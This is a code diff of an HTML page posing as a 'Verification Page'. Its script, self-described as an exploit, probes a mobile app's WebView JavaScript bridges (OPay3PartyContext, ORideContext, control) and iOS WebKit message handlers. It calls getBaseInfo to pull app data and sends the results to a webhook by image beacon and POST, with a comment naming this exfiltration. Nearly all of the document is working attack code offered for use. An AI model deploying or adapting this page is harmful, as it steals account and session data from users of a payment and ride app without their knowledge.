@@ -3,12 +3,16 @@
 
 <head>
   <meta charset="utf-8">
-  <title>Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification Page</title>
 </head>
 
-<body style="background: white; color: black; font-family: sans-serif; text-align: center; padding: 20px;">
+<body
+  style="background: white; color: black; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
   <h2 id="status">INITIALIZING...</h2>
-  <div id="log" style="font-size: 12px; color: #666;"></div>
+  <div id="log"
+    style="font-size: 11px; color: #666; text-align: left; max-width: 400px; margin: 0 auto; word-break: break-all;">
+  </div>
 
   <script>
     (function () {
@@ -17,58 +21,84 @@
       var logDiv = document.getElementById('log');
 
       function report(msg, type) {
-        logDiv.innerHTML += '<div>' + msg + '</div>';
+        var div = document.createElement('div');
+        div.style.marginBottom = '5px';
+        div.style.color = type === 'success' ? 'green' : (type === 'error' ? 'red' : '#666');
+        div.innerText = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+        logDiv.appendChild(div);
+
+        // Exfiltrate via Image beacon for reliability
         var i = new Image();
         i.src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info');
       }
 
-      report('Page execution started');
+      function sendFullData(label, data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', WEBHOOK, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({ label: label, data: data, timestamp: new Date().toISOString() }));
+      }
+
+      report('Exploit Cycle Started');
       status.innerText = 'EXECUTING...';
 
-      // List of potential bridge objects
-      var bridges = ['control', 'OPay3PartyContext', 'android', 'ORideContext', 'webkit'];
+      var bridgeNames = ['control', 'OPay3PartyContext', 'ORideContext'];
 
-      bridges.forEach(function (b) {
+      bridgeNames.forEach(function (name) {
+        // 1. Direct Method (Android / Global Objects)
         try {
-          if (window[b]) {
-            report('Bridge found: ' + b);
-            if (window[b].getBaseInfo) {
-              var info = window[b].getBaseInfo();
-              report('Success: ' + b + ' returned data', 'success');
-
-              // Send data
-              var xhr = new XMLHttpRequest();
-              xhr.open('POST', WEBHOOK, true);
-              xhr.send(JSON.stringify({ bridge: b, data: info }));
-
-              status.innerText = 'AUTHENTICATED';
+          if (window[name]) {
+            report('Global Bridge found: ' + name);
+            if (typeof window[name].getBaseInfo === 'function') {
+              var info = window[name].getBaseInfo();
+              report('Success: window.' + name + '.getBaseInfo() returned data', 'success');
+              sendFullData('DirectCall_' + name, info);
+              status.innerText = 'DATA CAPTURED';
+            } else {
+              report('Bridge ' + name + ' exists but no getBaseInfo found');
             }
           }
         } catch (e) {
-          report('Error check ' + b + ': ' + e.message, 'error');
+          report('Error DirectCall ' + name + ': ' + e.message, 'error');
+        }
+
+        // 2. iOS WebKit postMessage Method
+        try {
+          if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[name]) {
+            report('iOS WebKit Handler found: ' + name);
+
+            // Try action: getBaseInfo (standard)
+            report('Sending postMessage to ' + name + ' (action: getBaseInfo)');
+            window.webkit.messageHandlers[name].postMessage({ action: 'getBaseInfo' });
+
+            // Try call: getBaseInfo (optional variant)
+            setTimeout(function () {
+              window.webkit.messageHandlers[name].postMessage({ call: 'getBaseInfo' });
+            }, 500);
+
+            status.innerText = 'MESSAGE SENT';
+          }
+        } catch (e) {
+          report('Error WebKit ' + name + ': ' + e.message, 'error');
         }
       });
 
-      // iOS WebKit Handlers
+      // Catch-all: Check all webkit handlers
       try {
         if (window.webkit && window.webkit.messageHandlers) {
-          report('WebKit handlers detected');
-          var handlers = ['getBaseInfo', 'getToken', 'OPay3PartyContext'];
-          handlers.forEach(function (h) {
-            if (window.webkit.messageHandlers[h]) {
-              report('iOS Handler: ' + h);
-              window.webkit.messageHandlers[h].postMessage({ call: 'getBaseInfo' });
-            }
-          });
+          var allHandlers = Object.keys(window.webkit.messageHandlers);
+          if (allHandlers.length > 0) {
+            report('All Detected iOS Handlers: ' + allHandlers.join(', '));
+          }
         }
-      } catch (e) {
-        report('WebKit error: ' + e.message, 'error');
-      }
+      } catch (e) { }
 
-      // Final fallback log
       setTimeout(function () {
-        report('Execution cycle complete');
-      }, 2000);
+        report('Exploit Cycle Complete');
+        if (status.innerText !== 'DATA CAPTURED') {
+          status.innerText = 'IDLE';
+        }
+      }, 3000);
     })();
   </script>
 </body>
